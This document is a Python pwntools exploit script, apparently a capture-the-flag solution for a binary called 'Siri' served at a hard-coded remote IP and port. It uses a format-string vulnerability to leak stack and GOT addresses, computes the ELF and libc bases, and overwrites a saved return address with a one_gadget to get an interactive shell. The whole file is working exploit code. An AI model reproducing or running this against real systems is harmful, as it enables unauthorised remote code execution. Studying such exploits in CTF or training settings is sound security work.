from pwn import *

context.arch = "amd64"
# context.terminal = ('/mnt/d/bin/wsl-terminal/open-wsl.exe', "-e")
# context.log_level = "debug"
# io = process("./Siri")
io = remote("123.56.170.202", 12124)
elf = ELF("./Siri")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")

def execute_fmt(payload):
    io.sendlineafter(">>> ", b"Hey Siri!")
    io.sendlineafter("you?\n>>> ", b"Remind me to " + payload)
    ret = io.recvline()
    return ret

fmt_use_main = FmtStr(execute_fmt, offset=50, padlen=3, numbwritten=0x1b)
sub_1212_ret_offset = 0x144c
sub_1212_ret_addr = fmt_use_main.leak_stack(47)
main_rbp = fmt_use_main.leak_stack(46)
# 0x7fffffffdb90 —▸ 0x7fffffffdcb0 == 0x120
sub1212_rbp = main_rbp - 0x120
sub1212_ret_addr = sub1212_rbp + 8
elfbase = sub_1212_ret_addr - sub_1212_ret_offset
log.success("elfbase %#x main_rbp %#x" % (elfbase, main_rbp))
one_gadget = 0x4f365
leak_payload = b"aaa%51$saaa" + p64(elfbase + elf.got["alarm"])
# gdb.attach(io)
alarm_addr = execute_fmt(leak_payload)
alarm_addr = u64(alarm_addr[-16:-10]+b"\x00\x00")
libcbase = alarm_addr - libc.symbols["alarm"]
log.success("alarm_addr %#x libcbase %#x" % (alarm_addr, libcbase))
fmt_use_main.write(sub1212_ret_addr, libcbase + one_gadget)
fmt_use_main.execute_writes()
io.interactive()
io.close()
